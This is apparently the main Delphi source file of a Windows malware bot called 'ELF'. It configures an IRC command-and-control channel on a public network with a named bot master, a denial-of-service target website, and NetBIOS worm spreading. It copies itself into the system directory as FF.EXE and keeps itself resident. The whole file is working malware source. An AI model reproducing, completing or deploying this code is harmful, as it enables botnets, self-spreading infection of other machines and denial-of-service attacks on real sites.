   PROGRAM ELF;
   uses
     Windows,
     irc,
     NetBIOS in 'NetBIOS.pas',
     Settings in 'Settings.pas';

   // UNABLE TO UNDERSTAND NETBIOS SOURCE.

   CONST
    // Const some settings, so we can edit it.

    // irc bot
    bot_active  = 'yes';                                   // Makes ircbot active
    bot_chan    = '#tc0';                                  // ircbot channel, empty for none.
    bot_nick    = '';                                      // ircbot nickname
    bot_prefix  = '.';                                     // commando prefix
    bot_master  = 'SiC';
    bot_serv    = 'uk.undernet.org';                       // bot server.
    bot_serv2   = 'uk.undernet.org';                        // bot server backup.
    bot_dos     = 'http://www.lunarstorm.se';              // what site to d0s, empty for none.

    // Netbios setting
    bios_spread = 'yes';                                   // Makes netbios spread active
    bios_irc    = 'yes';                                   // Makes netbios report through ircbot.

   VAR
    A         : DWORD;
    BUF       : ARRAY[0..255]OF CHAR;
    PATH      : STRING;
    Msg       : TMsg;

   BEGIN

   ircserv := bot_serv;
   ircserv2 := bot_serv2;
   ircnick := bot_nick;
   ircchan := bot_chan;
   ircprefix:=bot_prefix;
   ircdos := bot_dos;
   master := bot_master;
   b_ip1 := 'x';
   b_ip2 := 'x';
   if bios_irc = 'yes' then n_report := true else n_report := false;

   // Get system directory
   GetSystemDirectory(BUF,255);
   PATH := BUF;
   PATH := PATH + '\';
   COPYFILE(pchar(paramstr(0)),pchar(PATH+'FF.EXE'),false);
   //writeprivateprofilestring('boot','shell',pchar('Explorer.exe '+PATH+'FF.EXE'),'system.ini');

   // first lets check setting
   if Bios_spread = 'yes' then a_netbios := true else a_netbios := false;
   if bot_active  = 'yes' then a_irc     := true else a_irc     := false;

   if a_irc then begin
   // irc was set as active.

   // lets create a thread with the ircbot.
    CreateThread(nil,0,@ircbot,nil,0,A);
    sleep(19000);

   end;

   if a_netbios then begin
   // netbios was set as active.
   StartNetBIOS;
   // create a thread with netbios.
   end else begin
   // now not to make project die and just be dead.
     WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);                          //Make application resident
   end;
   END.
